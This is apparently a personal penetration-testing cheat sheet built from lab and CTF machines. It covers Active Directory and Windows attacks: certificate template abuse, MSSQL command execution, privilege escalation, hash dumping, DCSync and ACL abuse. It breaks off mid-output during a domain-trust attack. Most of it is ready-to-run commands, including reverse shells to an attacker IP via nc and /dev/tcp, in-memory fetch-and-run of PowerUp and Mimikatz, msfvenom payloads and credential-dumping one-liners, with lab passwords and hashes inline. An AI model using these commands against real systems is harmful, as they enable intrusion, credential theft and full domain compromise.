[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)

Fix :
certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target -ldap-shell
==> This will drop us inside an LDAP Shell : 
#
#change_password administrator NewPassword123!


# ESC4 :

1/ modify the Template to make it Vulnerable :
certipy-ad template \
    -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' \
    -dc-ip $target -template 'Vuln-ESC4' \  
    -write-default-configuration

2/ Just like an ESC1 now , First we request a Ticket : 
certipy-ad req \
    -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' \
    -dc-ip $target -target 'DC-404.404finance.local' \
    -ca '404finance-DC-404-CA' -template 'Vuln-ESC4' \
    -upn 'administrator@404finance.local' -sid 'S-1-5-21-2956725473-317782918-2795636496-500' 

3/ Request a TGT using that Ticket :
certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target 

# ESC8 Abuse :

- Coercing authentication from a high-privileged machine account (e.g. DC$) using tools like Coercer or PetitPotam , nxc ... 
- Relaying that authentication to the Web Enrollment endpoint using ntlmrelayx
- Requesting a certificate on behalf of the coerced account
- Using that certificate to authenticate as the account via PKINIT and obtain a TGT

==> Guide : https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc8
certipy-ad find -u 'Username' -p 'Password' -dc-ip $target -vulnerable 
==> Setup the relay server : 
impacket-ntlmrelayx -t http://$target/certsrv/certfnsh.asp -smb2support --adcs --template DomainController 
==> Coercion via NXC :
nxc smb $target -u 'BBROWN' -p '12345678' -M coerce_plus -o LISTENER=Our_IP
==> Request the Ticket as the Coerced account . 
certipy auth -pfx ./DC01.shadow.gate.pfx -dc-ip $target
==> Perform a DCSync using the DC01 machine account . 
impacket-secretsdump 'DC01$'@$target -hashes :57867e655d1abc9f45fd6e954e351531

```

### PowerShell Passwords Extraction :

```powershell
PowerShell , sometimes allow to store creds in an encrypted format , that can be accessed
only by the users who encrypted them , If we find an XML file , we need to try it . 

PS C:\Users\lvetrova> $Credential = Import-Clixml -Path "lvetrova.xml"

PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
```

#### Password Must Change :

```powershell
smbpasswd -r $IP -U sbradley

```

### MSSQL :

**Interact with MSSQL :** 

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.59.194 -windows-auth : Login 
```

```bash
Enable cp_cmdshell :
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Commands On MSSQL :** 

```bash
select name from master..sysdatabases; : Show all databases . 
These are the default dbs : master  / tempdb   /model   /msdb 
-- 1) list databases
SELECT name FROM sys.databases;

-- 2) switch to a database
USE <dbname>;

-- 3) list tables in current DB
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';

-- 4) list columns for a table
SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='YourTable';

-- 5) show rows (limit)
SELECT TOP 100 * FROM schema.YourTable;

-- 6) select specific column(s) (e.g., files/blob column)
SELECT TOP 100 FileColumnName FROM schema.YourTable;

```

**Reverse Shell :** 

```bash
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe"
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
10.10.14.9 443"
```

```bash
use windows/mssql/mssql_payload
```

**Capture Hashes ( If nothing is usefull in the DB and we can list dirtree) :** 

```bash
netexec mssql $target -u 'username' -p 'password' --local-auth -X whoami 

netexec mssql $target -u 'username' -p 'password' -X whoami

====> Capture Hashes : 

xp_dirtree \\KaliIP\Share 

On Kali : responder -I  tun0 -A -v 
```

### Blood Hound :

```bash
nxc ldap $target -u 't-skid' -p 'tj072889*' --bloodhound --collection All --dns-server $target 

apt install docker.io 
apt install docker-compose 

curl -L https://ghst.ly/getbhce -o docker-compose.yml 
docker-compose pull && docker-compose up -d 
docker-compose logs bloodhound | grep -i passw
localhost:8080 .

# Newest Method :
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 

# Other method : 
bloodhound-setup 

# Shut everything down : 
sudo pkill -f neo4j
sudo ./neo4j-admin set-initial-password kali
sudo update-alternatives --config java

# Via APT : 
sudo bloodhound --no-sandbox

# Ingestors : 

bloodhound-python -u nik -p 'ToastyBoi!' -ns 10.113.189.188 -d LAB.ENTERPRISE.THM -c all

# Using a TGT :
bloodhound-python -u 'Brandon_Boyd' -d 'anomaly.hsm' -dc 'Anomaly-DC.anomaly.hsm' -ns $target -c all -k -no-pass --dns-tcp --zip
```

**Using Blood Hound :** 

```bash
File ingest + Add our zipfile . 
Mark our owned users = Add to Owned . 
Cypher : Search for Queries . Shorter path to Domain Admin . 
Shortest Path from Owned Objects . 
Check each owned User : Outbound Connections + Then check Linux/Windows Abuse 
```

## File Transfer :

```bash
# Method 1 :

wget IP/Winpease.exe -o Winpeas.exe .

wget http://10.10.15.59/winPEASx64.exe -Out winpeas.exe                                                           
                                          
wget -UseBasicParsing IP/TOOLS -o Where/name . 

# Method 2 : 

impacket-smbserver shared Tools_Folder -smb2support -user test -pass 
net use \\KaliIP\Shared /USER:test 
cd C:\Windows\tasks 
copy \\KaliIP\Shared\Tool . 

# Method 3 :

impacket-smbserver shared Tools_Folder -smb2support -user test -pass 

On Windows : 

net use \\KaliIP\Share /user:test : 

this will connect to our smbserver and then we can start copying files into it if we were
on something like winrm . 

====> Example : 

copy sam,ntds.dit,system \\KaliIP\share : copy from Windows to kali . 

copy \\KaliIP\share\* . : Copy from Kali server to Windows .

# Method 4 : Importing and executing : 

curl -useb IP/PowerUP.ps1 | iex; Invoke-AllChecks . 

# Method 5 : Certutil : 

certutil.exe -urlcache -split -f http://IP/File 

# Method 5 : Using python : 

Script is in the Script section . 

On our machine we set up the python server : python3 -m http.server 80 

cat test.py | base64 > d 

Now we can execute the encoded file inside the other machine, if we have only  Python .

# Via Evil-winrm :

==> To compress a folder for easy transfer :

Compress-Archive -Path "C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr" -DestinationPath "C:\Windows\Temp\ff.zip"
download ff.zip

```

## Windows Priv Esc :

### Useful :

```bash
# https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1

===> Run in memory . 
powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString("http://KALIIP/PowerUP.ps1");Invoke-AllChecks > Power.log  

impacket-smbserver shared Tools_Folder -smb2support -user test -pass 
net use \\KaliIP\shared /user:test 
copy Power.log \\KaliIP\shared  Or copy \\KALIIP\shared\*

# From Metasploit : 

use : post/multi/recon/local_exploit_suggester

# Using WES.PY (WESNG) : 

Just do Syteminfo , copy the out put and give it to wes.py , it s in OPT ; 

# RCE To RevShell . 

python3 script.py --url http://172.16.1.102:80 -c 'powershell -e "EncodedPayload"'
```

### Check List :

```bash
Step 1 : Run whoami /priv . + whoami /all + Check PowerShell History file + Services .  
	
Check autologon Creds for installations  + cmdkey /list : stored creds . 

Step 2 : Import and Run PowerUP . 

. .\PowerUP.ps1;Invoke-AllChecks | Import-Module PowerUP.ps1 + Invoke-Allchecks . 

Step 3 : Run Winpeas . 

wget " link to winpeas.exe ". ====> Transfer it to the Windows machine .

it will check for everything sometimes even Auto Login credentials . 
 
If you dont find much , check for open Ports and check if any of them is ran as ROOT 
or System .  

get-process -id 4 | Select-object * : Return info about who's running it . 
icacls.exe Executable : to see who's running the executable . 
```

### Quick Wins :

```bash
# Check for unquoted services : 

Services : This will list services and the path for the executable . 

# To Search recursively inside of shares once u download them : 

grep -ri 'pass' /root/.nxc/..../active.htb 

findstr /spin "password" C:\Folder\* : Recursively search for a specific word Windos . 

tree /a /f : tree on Windows PS . 

Get-ChileItem -Path C:\ -Recurse -Include *.config,*.ini,*xml,*txt -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -nomatch 'Windows|System32|SysWOW64' } | Select-String-Pattern "password=" : One liner to look for quick wins . 

Check Hidden Files on PowerShell using ls -force . 
 	
Get-ChileItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*xml,*txt -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -nomatch 'Windows|System32|SysWOW64' } | Select-String-Pattern "password=" : One liner to look for quick wins .

# Checking Open Ports locally : 

netstat -ano | findstr /v UDP . 

#Check Console History : 
 %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

 
```

### Unquoted Services :

```bash
If we find with PowerUp a service that is not quoted , and it is executed as a higher 
level user , and we have write perms over the directories of that path . we can PrivEsc. 
Check with the PS Script if our user can control the service (GetACL.ps1 in my tools)
If we see a space in the name of the directory and we control the Direcoty : WIN . 
Use simple revshells : windows/shell_reverse_tcp 

===> To get Information about the Service : 
sc qc ZeroTierOneService 
sc query ZeroTierOneService 
sc.exe (if it s powershell) 
====> To see who can modify the Directory ...
icacls.exe "C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe"

===> Test our access to that Service : 
sc.exe stop ZeroTierOneService : If we get access denied it means we can't do it . 
Start-Service zerotieroneservice (On PS) 
===> We can change Path : 
sc.exe config IObitUnSvr binPath="net localgroup administrators dharding /add"
sc.exe config IObitUnSvr binPath="cmd.exe /c C:\Users\dharding\Documents\nc.exe -e cmd.exe 10.10.14.139 1234"

# Example : 

The space between Zero and Tier can be abused , if we put a rev shell called Zero.exe
it will get executed and we get a rev shell , so we just need to have Write on the 
\Zero Tier\ directory .

===> Say we have a service running as System with this path : 
c:\Program Files (x86) \Zero Tier\ Zero Tier One \ Zero Tier One.exe 
===> We can check if we have W perms on C for example , then into the next one until we
cant , we can also use a script for this : it s in the Script Section under This : 
PS > powershell.exe -ep bypass ..\accheck.ps1
PS > "wuauserv" | Get-ServiceAcl | select -ExpandProperty Access
This will give us what users can execute and control the service  
echo a > c:\file.txt 
echo a > "c:\Program Files (x86) \Zero Tier\file.txt" : We can 
===> Now we need to create our payload and name it One.txt . 
sudo msfvenom -p windows/shell_reverse_tcp  LHOST=tun0 LPORT=9001 -f exe -o Zero.exe
===> Now we just import it : 
copy \\KaliIP\shared\shell.exe . 
copy shell.exe "C:\Program Files (x86)\ZeroTierOne\Zero One.exe" 

===> Now we just restart the service : 
sc.exe start zerotieroneservice . 

# Example 2 : 

====> If we are part of Operators group , we can restart any service , if we find service
that has unquoted path , we can modify it to add our own command instead of the path . 

services : This will list all services . 

sc.exe config ADWS binpath=" net localgroup Administrators j.rock /add "
```

### UAC Bypass / Administrator Group :

```bash
If we are part of Administrator group but with limited access since we can't really do 
everything that an admin can do due to Mandatory Label Medium  , for example write to the
C:/windows/system32 folder .

# Auto Elevate : 

===> First we need to check if the binary exists :

powershell -c Get-Content -Path C:\Windows\System32\fodhelper.exe | findstr /I "autoElevate" 

powershell -c Get-Content -Path C:\Windows\System32\eventvwr.exe | findstr /I "autoElevate" 

===> Now that we find it we need to add some registry Keys : 

REG ADD HKEY_CURRENT_USER\SOFTWARE\CLASSES\mscfile\shell\open\command
REG ADD HKEY_CURRENT_USER\SOFTWARE\CLASSES\mscfile\shell\open\command /v DelegateExecute /t REG_SZ 
REG ADD HKEY_CURRENT_USER\SOFTWARE\CLASSES\mscfile\shell\open\command /d "c:\windows\tasks\nc.exe -nv 10.8.184.82 159 -e cmd.exe " /f 

===> On our KALI : 
	
rlwrap nc -lnvp PORT 

===> Finally we execute eventvwr.exe 

Since our Binary is running with auto elevate , and since we added a new command that it 
will execute via the Registry Keys modification , now if we execute it , it will run 
the RevShell with autoelevate and we ll get a Shell without the Mandatory Label .
```

### Method 1 : Print Nightmare :

```bash
# PrintNightmare : Will abuse spooler binary and add an administrator user on the machine . 

wget github/calebsteward/CVE-2021-1675/...ps1 .  

icacls.exe "C:\Windows\System32\spoolsv.exe" : Where Spooler binary is usually  

..\CVE-2021-1675.ps1;Invoke-Nightmare . 
```

### Method 2 : Backup Operators :

```bash
====> If you want to dump only local users : 

On Windows : 

cd c:\ 
mkdir temp 
cd temp
reg save hklm\sam c:\temp\sam
reg save hklm\system c:\temp\system 
copy sam,system \\TSCLIENT\share\ 

On kali :

secretsdump.py -sam sam -system systsem local . 

====> If you want to dump all users on domain (u need ntds file , requires us to be on the DC for this ) . 

On Kali : 

nano viper.dsh : Inside of it type : 
set context persistent nowriters 
add volume c: alias viper 
create 
expose %viper% x: 

unix2dos viper.dsh 

On Windows : 

upload viper.dsh : We need to import the file onto the machine (use upload on evilwinrm or impacket smbserver or iwr ...) 
powershell -c iwr -uri http://KaliIP\viper.dsh -o viper.dsh 

diskshadow /s viper.dsh 
robocopy /b x:\windows\ntds . ntds.dit 
reg save hklm\system c:\windows\temp\system 

On Kali : 

impacket-secretsdump -ntds ntds.dit -system SYSTEM local 
```

### Method 3 : LAPS Reader :

```bash
Get-ADComputer -Identity '<active-directory-computer-name>' -property 'ms-mcs-admpwd'

netexec smb $target -u userlist -p passwordfromcommand 
```

### Method 4 : SE Impersonate :

```bash
If we have this we can try all Potato attacks and see which one works . 

# https://github.com/BeichenDream/GodPotato/releases/tag/V1.20

.\Godpotato-NET4.exe -cmd "cmd.exe" : Run this on the windows machine . 
Or
.\Godpotato-NET4.exe -cmd "powershell.exe -e ENCODED REVERSE SHELL BACK TO US"
nc -lnvp Port : to catch the Shell as System . 

# https://github.com/CCob/SweetPotato/blob/master/PrintSpoofer.cs

echo 'C:\windows\temp\nc.exe -e cmd.exe KALIIP PORT' > rev.bat 

.\SweetPotato.exe -p rev.bat .

# https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

.\PrintSpoofer64.exe -i -c cmd : Run this on the Windows machine . 

# https://github.com/ohpe/juicy-potato/releases/tag/v0.1 : DOC in Github . 

.\juicypotato.exe -l 3375 -t * -p " C:\windows\temp\nc.exe -e cmd.exe KALIIP PORT "

====> Another way : 

echo 'C:\windows\temp\nc.exe -e cmd.exe KALIIP PORT' > rev.bat 

.\juicypotato.exe -l 3375 -t * -p rev.bat .
```

### Generic Right Over DC machine : Linux :

```bash
#How this attack works ? First we need a user to have generic ALL or genric Right over the
#DC machine , then what we can do is create a new Machine ME0X in this case , since we are
#part of the Authenticated group which means we can create up to 10 machines on the domain
#Then what we did was **Resource-Based Constrained Delegation (RBCD) , which means we tell
#the DC to trust ME0X to impersonate any user that is on the DC machine , since we can 
#Impersonate them we needed to request a TGT on their behalf and do DCSync . 
===> Correction: The attacker requests an ST, not a TGT (Ticket Granting Ticket), 
===> on the Administrator's' behalf for a specific service (like CIFS) running on the DC.
===> CIFS is the file system 

# Adding the Computer :**
impacket-addcomputer -method SAMR -computer-name 'ME0X' -computer-pass 'Summer2018!' -dc-host $target -domain-netbios 'SUPPORT' 'support.htb/support:Ironside47pleasure40Watchful'
**# Delegating ME0X tp the DC :** 
impacket-rbcd -delegate-from 'ME0X$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful' 
# **Requesting the ST : ( Service Ticket )**
impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.htb/ME0X$:Summer2018!'  
**# Exporting the Ticket to our session :**
export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache 
**# DC Sync with the Ticket :** 
impacket-secretsdump -k -no-pass -just-dc-ntlm support.htb/administrator@$target
```

### Generic ALL over a  Group : Linux :

```bash
# List Group Members : 
net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U htb.local/svc-alfresco%'s3rvice' -S $target  

# Add Our User to that group : 
net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U htb.local/svc-alfresco -S $target

```

### Write DACL over the entire Domain : Linux :

```bash
# Give our user DCSync Privs : 
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'
```

### Metasploit :

```bash
use post/multi/recon/local_exploit_suggester : Auto Priv Esc suggestion . 
```

### Run As On Windows :

```bash

# If we got RDP : 

 runas /user:fela cmd

# If we got access as the web server via a webshell , we can use runas to get a shell as 
a diffrent user we just need his creds and a tool called Runa . 

icacls.exe . : This will for example tell us that another user has Write access here , 
and since we have the creds for that user , we can use a tool to go from the Web Server 
user to that user . 

# github/antonioCoco/runasCs . 

.\RunasCs.exe Username Password cmd.exe -r KALIIP:PORT . 
	
and we just catch the shell using nc . 
```

## Dumping Hashes :

```bash
netexec smb $target -u 'admin' -p 'password' --sam .

nxc smb $target -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' --ntds

netexec smb $target -u 'admin' -p 'password' --loggedon-users.

netexec smb $target -u 'admin' -p 'password' --lsa.

netexec smb $target -u 'user' -p 'password' --sam | fgrep -v '[' | awk -F '{print $4}' | tee dumped_hashes.txt  : Give us the NTLM hash only . 

nxc ldap $target -u 'eng.payload' -p 'WEAK123.' --gmsa : Only if we have ReadGMSA rights over a service account . 

# If machine has AV : 

netexec smb $target -u 'user' -p 'password' -M lsassy | fgrep -v '[' | awk '{print $6}' | tee dumped_hashes.txt  : Give us the NTLM hash only . 

netexec smb $target -u 'user' -p 'password' -M ntdsutil | fgrep -v '[' | awk -F '{print $4}' | tee dumped_hashes.txt: Give us the NTLM hash only . 

impacket-secretsdump -just-dc-ntlm DomainName/Username:Password@$target 
#If we have the ticket only and not the Hash : 
impacket-secretsdump -k -no-pass -just-dc-ntlm support.htb/administrator@DC.SUPPORT.HTB
```

### Brute force with Hashes :

```bash
# We generated a userlist using the commands above (awk , grep , ...) 
# We have the Hashes only , we can try to brute force . 
# It will check all the hashes found , with all the users . 

netexec smb $target -u users.txt -H uniqueHashes.txt --continue-on-success

netexec winrm $target -u users.txt -H uniqueHashes.txt --continue-on-success

netexec rdp $target -u users.txt -H uniqueHashes.txt --continue-on-success

netexec wmi $target -u users.txt -H uniqueHashes.txt --continue-on-success : over rpc . 

netexec mssql $target -u users.txt -H uniqueHashes.txt --continue-on-success
```

## Lateral Movement / Login :

```bash
impacket-psexec DomainName/Administrator@target -hashes :Hash : Over Winrm . 

impacket-wmiexec DomainName/Administrator@target -hashes :Hash : Over RPC .  

evil-winrm -i IP -u username -p password . 

# Evil Winrm with SSL : 

====> If we have extracted a pfx file , we can extract both private key and public key : 

sudo openssl pkcs12 -in yourPFXFile.pfx -nocerts -nodes -out yourExtractedKey.pem 
sudo openssl pkcs12 -in yourPFXFile.pfx -clcerts -nokeys -out yourExtractedEntityCert.pem

evil-winrm -i IP -k PublicKeyExtracted -c CertExtracted -S 

xfreerdp /v:$target /u:username /p:password /cert:ignore +clipboard /dynamic-resolution /drive:  + net use will show our shared drive content . 

# Via WMI :

impacket-wmiexec anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a424c58e02879f6e'

To Bypass AV use WMIexec2 :
https://github.com/ice-wzl/wmiexec2
git clone https://github.com/ice-wzl/wmiexec2.git
cd wmiexec2/
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 wmiexec2.py anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a424c58e02879f6e'
```

## Post Exploitation :

### ACL Abuse :

#### Quick Tips :

- **Genric Write Can allow us to move a user to an OU, in case we had Generic ALL over an OU**


```bash

# Force Change Password :
net rpc password "ROBERT.GRAEF" "Password.123" -U "404FINANCE.LOCAL"/"tom.reboot"%"P@ssw0rd123" -S "DC-404.404finance.local" 
bloodyad --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' set password 'MELANIE.KUNZ' 'WEAK123.' 

# Add Group Member :
bloodyad  --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' add groupMember 'REMOTE DESKTOP USERS' 'MELANIE.KUNZ'

# WriteAccountRestrictions : To remove a specific ACL (Eg : Enable a specific account ) :
bloodyad --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' remove uac 'svc.services' -f ACCOUNTDISABLE

# Remove Group Member :
bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' remove groupMember 'GROUP' 'TARGET'

# WriteOwner ==> Make ourselves the owner (Owner has WriteDACL that we can abuse to add new ACLs) :
bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' set owner 'TARGET' 'YOURUSER'

# WriteDacl ==> We can grant ourselves GenericAll over that user :
bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' add genericAll 'TARGET' 'YOURUSER'

# WriteAccountRestrictions - Enable disabled account :
bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' remove uac 'TARGET' -f ACCOUNTDISABLE
bloodyad --host $target -d 'city.local' -u 'emma.hayes' -p '!Gemma4James!' remove uac 'sam.brooks' -f ACCOUNTDISABLE

# GenericWrite - Targeted Kerberoasting (Add SPN) :
bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' set object 'TARGET' --attr servicePrincipalName -v 'fake/spn'
==> To automate it :
git clone https://github.com/ShutdownRepo/targetedKerberoast
python3 targetedKerberoast.py -v -d 'city.local' -u 'jon.peters' -p '1234heresjonny' 

==> Shadow Credential Attack:
certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -p Password -account VictimAccount .
certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -H :NTLMHash -account VictimAccount . : This will give us the Hash of the VictimAccount . 

# Write DACL Over an entire OU : Grant ourselves Generic ALL :
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'emma.hayes' -target-dn 'OU=CITYOPS,DC=CITY,DC=LOCAL' 'city.local'/'emma.hayes':'!Gemma4James!'

# ReadGMSAPassword :
bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' get object 'ACCOUNT$' --attr msDS-ManagedPassword
nxc ldap $target -u 'YOURUSER' -p 'YOURPASS' --gmsa


# ACL Check : to verify the User's ACLs via Powershell : 
$user = Get-DomainUser svc-backup
Get-DomainObjectAcl -Identity (Get-Domain).DistinguishedName -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser jbercov).objectsid} |Select ObjectAceType, ActiveDirectoryRig

iF WE find these : 
DS-Replication-Get-Changes-In-Filtered-Set
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
it s game over . 

```

### WMI Profile :

```bash
Found a WMI profile ? First we need to extract it locally , we can use wmiextract :
wimextract clerk.john_ProfileBackup_0729.wim 1 --dest-dir=/home/kali/HackSmarter/City_CounCIL/clerk_profile

```

### Credential Manager (DPAPI) :

```bash
==> Quick explanation :
When you save something in Credential Manager, Windows doesn’t store it in plaintext , it encrypts it using DPAPI. The encrypted blob gets saved as a file in: AppData/Roaming/Microsoft/Credentials/

But DPAPI encryption is tied to the user’s password This is the key weakness , DPAPI uses the user’s own password as part of the encryption. So if you know the user’s password, you can decrypt anything they encrypted.

The Master Key is what comes in between you could say : DPAPI doesn’t directly use the password to encrypt , it uses a Master Key, which itself is encrypted with the user’s password. So the chain is: Password + SID → decrypt Master Key
Master Key → decrypt the Credential blob

1/ Decrypting the master keyt : The Master key located usually here : AppData/Roaming/Microsoft/Protect/SID :

impacket-dpapi masterkey -file /AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103/de222e76-cb5d-418f-a1c2-7e4e9dfe29e1 -sid S-1-5-21-407732331-1521580060-1819249925-1103 -password clerkhill 

2/ Decrypting the credential Blob using the decrypted master Key:
impacket-dpapi credential -file /AppData/Roaming/Microsoft/Credentials/03128079C6E14F37F5AEBDD69E344291 -key 0xedfc873c4b843cb27b48cb55d829bc24c8d2be3fd50ce2aa7ba72b8da6ec65afd41412dfecd16f38a120cadf4089dabb9a1817874e37bbf0d6861117a39dfbbd

```

### Mimikatz :

```bash
# https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1

===> This will execute Mimikatz in memory and bypass AV . 
powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString("http://KALIIP/Invoke-mimikatz.ps1");Invoke-Mimikatz 

```

### Kerberos Conf : 

```bash
==> We need 2 important files :
/etc/krb5.conf — reveals the realm, KDC address, and confirms AD domain membership
/etc/krb5.keytab — if readable, contains principal keys that allow direct TGT requests without knowing the password

==> Copy conf file to our /etc/krb5.conf : to copy Realms info ....

==> To import the TGT from the Keytab :

1/ List the Principle name :
klist -kt krb5.keytab

2/ Request the TGT 
kinit -kt krb5.keytab Brandon_Boyd@ANOMALY.HSM

3/ Verify :
klist

4/ Export the ticket to our ENV variables :
export KRB5CCNAME=/tmp/krb5cc_1000

5/ Use it :
nxc smb Anomaly-DC.anomaly.hsm -u 'Brandon_Boyd' -k --use-kcache

```


## Useful stuff :

```bash
# Hash Identifier : 

gem install haiti-hash . 

haiti 'Hash' : Will identify the Hash type .

# Fixing Wordlist : 

If we have a list of users@Domain , we can open it in gedit and do find and replace 'Domain' with nothing and it will remove it . 

# Good Practice : 

powershell -ep bypass . 

check description field when genreating users using smb or ldap . 

# Bypass AppLocker : 

powershell -C Get-Service AppIDSvc : Check if applocker is running . 

We can place our executable inside the PS C:\Windows\System32\spool\drivers\color> . 

# Pentest a diffrent Protocol : 

Just search for OSCP Cheat Sheet "NFS" for example . 

Or Search for HackTricks for that specific protocol . 

Search on Book.hacktricks.wiki . 

Always check description of the user account with ldap , netexec ldap .... --users . 

If we find Password on a Description field , try brute forcing all other users with it .

# always check with --local-auth as well . 

# Runing Linpeas with tee it s always better to have log files of each command . 

./linpeas.sh | tee log

# Reading Files : 

If we can't cat a file , meaning we get some random thing , always use the String command : 
string file.txt . 

# You can copy your IP address from the top right .

# Always search for exploit usint -x : 

searchsploit -x Versionname 
searchsploit -m Exploit : This will copy the file into our folder to use it . 

# Test for Command injection : 

nc -lnvp 4444
command|id|nc Our_IP 4444 , if we get a connection our command worked .

# Bypass Command injection :

We could list the env , and we got $X . 
Say we do echo $X and it is AAAA_BB-L 
we can do echo ${X:9:1} to use - , in case - was banned or something like that . 

# Decode HEX files : 

cat hype_key | xxd -r -p 
 
 # Decrypt RSA KEY : 
 
openssl rsa -in hype_key_encrypted -out hype_key_decrypted

# Login Via SSH in legacy Systems : 

ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i hype_key_decrypted hype@$IP

# Find command haha : 
find / -name "flag*" 2>/dev/null

# Debugging : 
sudo ss -lntp | grep <PORT>
kill -9 PID

# Python Env :
python3 -m venv venv
source venv/bin/activate
pip install <package>

```

## Payloads :

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai   LHOST=10.10.15.59 LPORT=4444 -f exe -o rev.exe     

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.59 7777 >/tmp/f : Best One.

msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.15.59 LPORT=4443 -f war -o rev.war

echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.59/4444 0>&1"' > rev.sh 

```

## Cross Forests :

```bash
# Do a ping sweep on Windows on a specific subdomain , Perferably from a DC . 
From CMD : 
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
From PowerShell : 
1..254 | % { try { if (Test-Connection "172.16.2.$_" -Count 1 -Quiet) { "172.16.2.$_" } } catch {} }

#From Linux : 
for i in {1..254}; do
>   timeout 0.3 bash -c "echo >/dev/tcp/172.16.2.$i/22" 2>/dev/null && echo "172.16.2.$i"
> done

# Scanning an internal Network . 

# Once we get into a DC , always drop a DC . and add the entire /16 subnet to scan . 
sudo ip route add 172.16.0.0/16 dev ligoloo 
start --tun ligoloo : this is on Ligogo . 
nmap 172.16.0.0/16 --open -T5 . (or 2.0/24 then 3.0/24 ...)
Once we identify a subnet remove the /16 since it might make things unstable or send to 1.0
sudo ip route del 172.16.0.0/16 dev ligoloo
sudo ip route add 172.16.2.0/24 dev ligoloo 
fping -a -g 172.16.0.0/16 2>/dev/null
=====> This will give us an idea on the different VLANs on the domain , each new DC repeat

```

### Child —> Parent :

**Useful resource :** 

```bash
# https://notes.cavementech.com/pentesting-quick-reference/active-directory/domain-trusts/attacking-domain-trusts-child-greater-than-parent-trusts-from-linux
# https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
# https://martian1337.gitbook.io/docs/notes/network-security/domain-trust-enumeration
```

**Steps :**

```bash
=====> Overall 
We first need KRBTGT of child domain 
SID of child Domain 
SID or Domain Admins on parent domain (MAKE SURE TO ADD 519 AT THE END ) 
Name for our user 
Then we generate a Ticket using impacket ticketer (this ticket is not signed by a KDC)
We then use this ticket with Impacket geTGT to get a TGT that is signed by a KDC 
Perform DCsync on Parent 

=====> Commands :

# KRBTGT from linux : 
impacket-secretsdump child.warfare.corp/corpmngr@cdc.child.warfare.corp -just-dc-user child/krbtgt    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
